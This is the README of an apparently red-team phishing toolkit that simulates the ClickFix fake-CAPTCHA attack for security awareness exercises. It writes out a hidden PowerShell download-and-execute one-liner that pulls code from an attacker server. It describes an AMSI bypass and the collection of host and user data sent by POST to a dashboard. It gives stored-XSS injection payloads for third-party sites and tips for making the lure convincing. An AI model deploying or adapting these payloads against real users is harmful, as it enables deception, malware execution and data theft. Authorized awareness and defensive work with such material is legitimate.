# FakeCaptcha — ClickFix Security Awareness Píldora

A controlled phishing simulation that demonstrates the **ClickFix** technique (fake CAPTCHA / paste-and-run) for security awareness training. Built for red team exercises and employee education.

The tool tricks targets into pasting a PowerShell command disguised as a CAPTCHA verification step. The payload collects basic system information (hostname, OS, IP, etc.) and reports it to a dashboard — proving the user would have been compromised in a real attack.

> **Authorized use only.** Always obtain written permission before deploying.

---

## How it works

1. Target visits a page that loads the FakeCaptcha SDK (via legitimate site compromise, Stored XSS, or the bundled demo client).
2. A convincing reCAPTCHA checkbox appears. Clicking it copies a PowerShell one-liner to the clipboard and shows "verification steps": **Win+R → Ctrl+V → Enter**.
3. The clipboard contains:
   ```
   powershell -w hidden -nop -c "irm 'https://<server>/s?t=<vid>' | iex #✅ I am not a robot ..."
   ```
   The `#` comment makes the trailing text look like a harmless verification code.
4. If the target follows the steps, PowerShell downloads and executes `template.ps1`:
   - **AMSI bypass** (obfuscated reflection zeroing of amsiContext/amsiSession).
   - **WMI collection**: hostname, username, domain, OS, RAM, MAC, IP, serial number, CPU.
   - **POST** to `/datos` with the collected JSON.
5. The server stores results in `db.json`. View them at `/dashboard`.

---

## Quick start (local dev with `uv`)

```bash
git clone <repo-url> && cd fakecaptcha
cp .env.example .env
```

Install [`uv`](https://docs.astral.sh/uv/) if you don't have it:

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
```

Install dependencies:

```bash
uv sync
```

Run in two terminals:

```bash
# Terminal 1 — attacker server
uv run python fakecaptcha/run.py

# Terminal 2 — demo victim site
uv run python client/app.py
```

Open `http://localhost:5000`, click the fake CAPTCHA, follow the "verification steps".
Check collected data at `http://localhost:8080/dashboard`.

---

## Deployment (Docker Compose + nginx)

See **[docs/deployment.md](docs/deployment.md)** for the full guide (host nginx vs. bundled nginx, TLS, dashboard protection).

**Quick version:**

```bash
cp .env.example .env
# Edit .env → set PUBLIC_URL to the real public-facing URL (e.g. https://drive-verify.example.com)

# Option A: you already have nginx on the host
docker compose up -d --build

# Option B: bundled nginx container
docker compose -f docker-compose.yml -f docker-compose.nginx.yml up -d --build
```

Always deploy behind **HTTPS** — a fake CAPTCHA over plain HTTP is suspicious to the target.

---

## SDK integration

### On pages you control

```html
<script src="https://<your-server>/sdk.js"></script>
<div id="captcha-box"></div>
<script>
  MiAuth.login('#captcha-box', function (data, verificationId) {
    // Target completed the flow
  });
</script>
```

The SDK auto-detects its origin from `document.currentScript.src` — no configuration needed.

### On pages you don't control (Stored XSS)

When you have a Stored XSS vector on the target site, inject the SDK with a minimal payload. The CAPTCHA will render on the target's own domain, making it far more convincing.

**Minimal injection (one line):**

```html
<script src="https://<your-server>/sdk.js"></script><script>MiAuth.login();</script>
```

This appends the fake reCAPTCHA to `document.body`.

**Attach to a specific element for better visual integration:**

```html
<script src="https://<your-server>/sdk.js"></script>
<script>MiAuth.login('#login-form');</script>
```

**JavaScript-only injection** (e.g., XSS in a `<script>` context, or injection via `innerHTML`):

```javascript
var s=document.createElement('script');s.src='https://<your-server>/sdk.js';s.onload=function(){MiAuth.login()};document.head.appendChild(s);
```

**Tips for realistic deployment:**

| Consideration | Detail |
|---|---|
| **Positioning** | `MiAuth.login()` with no container appends to `<body>`. Pass a CSS selector to attach to a specific element (login form, download gate, etc.). |
| **Visual match** | The CAPTCHA iframe replicates Google's reCAPTCHA look. The "Verification Steps" popup matches Google's styling. Font Awesome is loaded for the Windows key icon. |
| **Cleanup** | Once the payload reports back, the SDK removes the iframe and popup from the DOM automatically. |
| **Polling** | The SDK polls `/check-captcha` every 3 seconds. No action needed from the injected script. |
| **Callback** | The second argument to `MiAuth.login()` is optional. Use it if the XSS payload needs to react (e.g., redirect, hide an overlay). |
| **CORS** | The `/check-captcha` endpoint echoes back the request's `Origin` header, so the SDK works from any domain (local dev, Stored XSS, etc.) without extra configuration. |

**Example: Stored XSS in a forum comment field:**

```html
Nice post! <script src="https://drive-verify.example.com/sdk.js"></script>
<script>MiAuth.login();</script>
```

The CAPTCHA appears below the comment. Anyone viewing the page sees a "verify you're not a robot" prompt — indistinguishable from a real reCAPTCHA gate.

---

## Architecture

```
┌─────────────┐     ┌──────────┐     ┌──────────────────┐
│ Target site │────>│  nginx   │────>│ fakecaptcha:8080 │
│ (with SDK)  │     │ (reverse │     │  /captcha        │
└─────────────┘     │  proxy)  │     │  /sdk.js         │
                    │          │     │  /s?t=<vid>      │
                    │          │────>│  /datos          │
                    │          │     │  /check-captcha  │
                    │          │     │  /dashboard      │
                    │          │     └──────────────────┘
                    │          │     ┌──────────────────┐
                    │          │────>│ client:5000      │
                    └──────────┘     │  (demo site)     │
                                    └──────────────────┘
```

| Component | Description |
|---|---|
| `fakecaptcha/` | Attacker server — CAPTCHA UI, SDK, PowerShell payload, data collection, dashboard |
| `client/` | Demo victim site (Google Drive file download replica) — optional, for testing only |
| `nginx/` | Reverse proxy configs (host and Docker variants) |

## File structure

```
fakecaptcha/
├── run.py                  # Flask server
├── template.ps1            # PowerShell payload (AMSI bypass + WMI + POST)
├── entrypoint.sh           # Docker entrypoint (initializes db.json)
├── static/
│   └── sdk.js              # SDK for embedding in victim sites
├── templates/
│   ├── captcha.html        # Fake reCAPTCHA UI + clipboard logic
│   ├── dashboard.html      # Results panel
│   └── detalle.html        # Per-machine detail view
└── db/
    └── db.json             # Results store (gitignored)

client/
├── app.py                  # Demo victim Flask app
└── templates/
    └── index.html          # Google Drive replica with SDK integration

nginx/
├── nginx.conf              # Host nginx site config
└── nginx.docker.conf       # Docker nginx config
```

## Endpoints

| Method | Route | Description |
|---|---|---|
| `GET` | `/captcha` | Fake reCAPTCHA page (loaded in iframe by SDK) |
| `GET` | `/sdk.js` | JavaScript SDK for victim sites |
| `GET` | `/s?t=<vid>` | PowerShell payload with datos URL baked in |
| `POST` | `/datos?verification_id=<vid>` | Receives system info JSON from payload |
| `GET` | `/check-captcha?verification_id=<vid>` | Polled by SDK to check if payload reported |
| `GET` | `/dashboard` | Results panel (all machines) |
| `GET` | `/equipo/<hostname>` | Detail view for one machine |

## Data collected

The PowerShell payload gathers via WMI:

| Field | Source |
|---|---|
| `NombreEquipo` | `$env:COMPUTERNAME` |
| `Usuario` | `$env:USERNAME` |
| `DominioUsuario` | `$env:USERDOMAIN` |
| `Dominio` | `Win32_ComputerSystem.Domain` |
| `Fabricante` | `Win32_ComputerSystem.Manufacturer` |
| `Modelo` | `Win32_ComputerSystem.Model` |
| `RAM_Total_MB` | `Win32_ComputerSystem.TotalPhysicalMemory` |
| `SO_Nombre` | `Win32_OperatingSystem.Caption` |
| `SO_Version` | `Win32_OperatingSystem.Version` |
| `SO_Arquitectura` | `Win32_OperatingSystem.OSArchitecture` |
| `MAC` | `Win32_NetworkAdapterConfiguration.MACAddress` |
| `IP_Local` | `Win32_NetworkAdapterConfiguration.IPAddress` |
| `NumeroSerie` | `Win32_BIOS.SerialNumber` |
| `CPU_Nombre` | `Win32_Processor.Name` |

Edit `fakecaptcha/template.ps1` to add or remove fields. The `/datos` endpoint accepts any JSON with at least a `NombreEquipo` field.

## Security notes

- `/dashboard` and `/equipo/<hostname>` expose PII — protect with authentication or IP restriction in production.
- `db/db.json` is gitignored. Delete after the exercise and report delivery.
- Always deploy behind HTTPS.
- The `client/` component is a demo — in real exercises, inject the SDK into the actual target page via Stored XSS or similar.
